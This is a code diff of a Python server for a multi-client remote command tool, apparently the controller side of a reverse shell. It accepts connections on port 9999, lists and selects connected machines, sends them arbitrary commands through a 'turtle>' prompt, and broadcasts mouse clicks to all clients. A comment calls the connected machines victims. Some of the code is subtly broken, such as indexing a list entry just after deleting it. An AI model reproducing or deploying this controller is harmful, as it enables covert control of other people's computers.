@@ -2,111 +2,239 @@ import socket
 import sys
 import threading
 import time
+import traceback
 from queue import Queue
+from pynput.mouse import Listener
 
-NUMBER_OF_THREAD = 2
-JOB_NUMBER = [1, 2]
+NUMBER_OF_THREADS = 4
+JOB_NUMBER = [1, 2, 3, 4]
 queue = Queue()
-all_connection = []
+all_connections = []
 all_address = []
+global x_click
+global y_click
+global enable_send_click
 
 
-# Create a Socket ( connect 2 computers )
-def create_sockets():
+# Create a Socket ( connect two computers)
+def create_socket():
     try:
         global host
         global port
         global s
-        host = ''
+        host = ""
         port = 9999
         s = socket.socket()
+
     except socket.error as msg:
-        print("There's a err happend: " + str(msg))
+        print("Socket creation error: " + str(msg))
 
 
-def binding_socket():
+# Binding the socket and listening for connections
+def bind_socket():
     try:
         global host
         global port
         global s
-        print("Binding the port " + str(port))
+        print("Binding the Port: " + str(port))
+
         s.bind((host, port))
         s.listen(5)
+
     except socket.error as msg:
-        print("Fail in binding the port " + str(msg) + "Retrying to connect...")
-        binding_socket()
+        print("Socket Binding error" + str(msg) + "\n" + "Retrying...")
+        bind_socket()
 
 
-# Handling connections from multiple clients and saving to a list
+# Handling connection from multiple clients and saving to a list
 # Closing previous connections when server.py file is restarted
 
-def accepting_connection():
-    for c in all_connection:
+def accepting_connections():
+    for c in all_connections:
         c.close()
 
-    del all_connection[:]
+    del all_connections[:]
     del all_address[:]
 
     while True:
         try:
             conn, address = s.accept()
-            s.setblocking(1)  # prevent timeout
-            all_connection.append(conn)
+            s.setblocking(1)  # prevents timeout
+
+            all_connections.append(conn)
             all_address.append(address)
-            print("Connection has been established " + address[0])
+
+            print("Connection has been established :" + address[0])
+
         except:
-            print("Connection err")
+            print("Error accepting connections")
 
-# 2nd Thead function 1,see all clients 2,select a client 3,Send commands to selected client
-#
-# def start_turtle():
-#     cmd = input("turtle>")
-#
-#     if cmd == 'list':
-#         list_connection()
-#     elif 'select' in cmd:
-#         conn = get_target(cmd)
-#         if conn is not None:
-#             send_target_commands(conn)
-#     else:
-#         print("Command is not recognised")
 
-# Display all current active connections with the client
+# 2nd thread functions - 1) See all the clients 2) Select a client 3) Send commands to the connected client
+# Interactive prompt for sending commands
+# turtle> list
+# 0 Friend-A Port
+# 1 Friend-B Port
+# 2 Friend-C Port
+# turtle> select 1
+# 192.168.0.112> dir
 
-# def list_connection():
-#     results = ''
-#     selectedId = 0
-#     for i,conn in enumerate(all_connection):
-#         try:
-#             conn.send(str.endcode(' '))
-#             conn.recv(201480)
-#         except:
-#             del all_connection[i]
-#             del all_address[i]
-#             continue
-#     result = str(i) + "  " + str(all_address[i][0] + '  ' + str(all_address[i][1] + "\n"))
-#     print("----Client----" + "\n" + results)
-#
-# def get_target(cmd):
-#     try:
-#         target = cmd.replace('select ' ,'') # target = id
-#         target = int(target)
-#         conn = all_connection[target]
-#         print("You care now connected to :" + str(all_address[target][0]))
-#         print(str(all_address[target][0]) + ">" , end='')
-#     except:
-#         print("Selection is not valid")
-#         return None
-#
-# def send_target_commands(conn):
-#     while True:
-#         try:
-#             cmd = input()
-#             if cmd == 'quit':
-#                 break
-#             if len(str.endcode(cmd) > 0):
-#                 conn.send(str.endcode(cmd))
-#                 client_response = str(conn.recv(20480) , 'utf-8')
-#                 print(client_response , end='')
-#         except:
-#             print("Err command")
+
+def start_turtle():
+    while True:
+        cmd = input('turtle> ')
+        if cmd == 'list':
+            list_connections()
+        elif 'select' in cmd:
+            conn = get_target(cmd)
+            if conn is not None:
+                send_target_commands(conn)
+        elif 'enable_click' in cmd:
+            global enable_send_click
+            enable_send_click = True
+            print('Enable send click to client successfully')
+        else:
+            print("Command not recognized")
+
+
+def start_send_click():
+    is_logged = False
+    while True:
+        global x_click
+        global y_click
+        global enable_send_click
+        if x_click and y_click and enable_send_click:
+            if not is_logged:
+                print('Thread send click running')
+                is_logged = True
+            for conn in all_connections:
+                send_target_commands_click(conn, x=x_click, y=y_click)
+            print("Send_click_Success")
+            x_click = None
+            y_click = None
+
+
+# Display all current active connections with client
+
+def list_connections():
+    results = ''
+
+    for i, conn in enumerate(all_connections):
+        try:
+            conn.send(str.encode(' '))
+            conn.recv(20480)
+        except:
+            print(f'Error connect to {all_address[i][0]} ! Deleting')
+            del all_connections[i]
+            del all_address[i]
+            print(f'Delete {all_address[i][0]} done')
+            continue
+
+        results = results + str(i) + "   " + str(all_address[i][0]) + "   " + str(all_address[i][1]) + "\n"
+
+    print("----Clients----" + "\n" + results)
+
+
+# Selecting the target
+def get_target(cmd):
+    try:
+        target = cmd.replace('select ', '')  # target = id
+        target = int(target)
+        conn = all_connections[target]
+        print("You are now connected to :" + str(all_address[target][0]))
+        print(str(all_address[target][0]) + ">", end="")
+        return conn
+        # 192.168.0.4> dir
+
+    except:
+        print("Selection not valid")
+        return None
+
+
+# Send commands to client/victim or a friend
+def send_target_commands(conn):
+    while True:
+        try:
+            cmd = input()
+            if cmd == 'quit':
+                break
+            if len(str.encode(cmd)) > 0:
+                conn.send(str.encode(cmd))
+                # client_response = str(conn.recv(1024), "utf-8")
+                # print(client_response, end="")
+        except:
+            print("Error sending commands")
+            break
+
+
+def send_target_commands_click(conn, x, y):
+    cmd = f'click_mouse_client.py {x} {y}'
+    try:
+        if len(str.encode(cmd)) > 0:
+            print(str.encode(cmd))
+            conn.send(str.encode(cmd))
+            client_response = str(conn.recv(1024), "utf-8")
+            print(client_response, end="")
+    except Exception as err:
+        traceback.print_exc()
+        print("Error sending commands click")
+
+
+def start_listen_click():
+    def on_click(x, y, button, pressed):
+        if pressed:
+            global x_click
+            global y_click
+            print('Mouse clicked at ({0}, {1}) with {2}'.format(x, y, button))
+            x_click = x
+            y_click = y
+
+    with Listener(on_click=on_click) as listener:
+        listener.join()
+
+
+# Create worker threads
+def create_workers():
+    for _ in range(NUMBER_OF_THREADS):
+        t = threading.Thread(target=work)
+        t.daemon = True
+        t.start()
+
+
+# Do next job that is in the queue (handle connections, send commands)
+def work():
+    while True:
+        x = queue.get()
+        if x == 1:
+            create_socket()
+            bind_socket()
+            accepting_connections()
+        if x == 2:
+            start_turtle()
+        if x == 3:
+            start_send_click()
+        if x == 4:
+            start_listen_click()
+        queue.task_done()
+
+
+def create_jobs():
+    for x in JOB_NUMBER:
+        queue.put(x)
+
+    queue.join()
+
+
+def main():
+    if __name__ == '__main__':
+        global enable_send_click
+        global x_click
+        global y_click
+        enable_send_click = False
+        x_click = None
+        y_click = None
+        create_workers()
+        create_jobs()
+
+
+main()
